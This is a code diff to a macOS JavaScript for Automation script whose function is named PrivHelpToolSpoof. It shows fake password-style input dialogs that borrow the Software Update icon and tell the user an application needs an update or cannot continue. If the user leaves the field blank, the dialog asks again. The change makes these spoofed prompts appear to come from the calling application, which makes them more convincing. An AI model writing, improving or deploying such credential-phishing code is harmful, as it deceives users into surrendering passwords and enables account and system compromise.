@@ -2,6 +2,10 @@ ObjC.import('Foundation')
 ObjC.import('AppKit')
 var currentApp = Application.currentApplication();
 currentApp.includeStandardAdditions = true;
+var contextApp = currentApp.systemAttribute('__CFBundleIdentifier')
+var contextString = contextApp.toString()
+var newApp = Application(contextString)
+newApp.includeStandardAdditions = true;
 
 function PrivHelpToolSpoof(){
 
@@ -75,7 +79,7 @@ if (iconNameString.includes('icns') == true ){
 } else {var icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns"
 }
 
-var prompt = currentApp.displayDialog(text, {
+var prompt = newApp.displayDialog(text, {
 	defaultAnswer: "",
 	buttons: ['OK', 'Cancel'],
 	defaultButton: 'OK',
@@ -88,7 +92,7 @@ var prompt = currentApp.displayDialog(text, {
 var promptResults = prompt.textReturned
 if (promptResults == ""){
 	var textagain = appName + " is Unable to Continue" + "\n" + "Please Close the Application or " + privString + userName
-	var promptagain = currentApp.displayDialog(textagain, {
+	var promptagain = newApp.displayDialog(textagain, {
 		defaultAnswer: "",
 		buttons: ['OK', 'Cancel'],
 		defaultButton: 'OK',
@@ -109,7 +113,7 @@ var icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Res
     var title = "An Application Needs an Update to Continue";
     var text = "An Application Needs an Update to Continue";
 
-		var promptClassic = currentApp.displayDialog(text, {
+		var promptClassic = newApp.displayDialog(text, {
 			defaultAnswer: "",
 			buttons: ['OK', 'Cancel'],
 			defaultButton: 'OK',
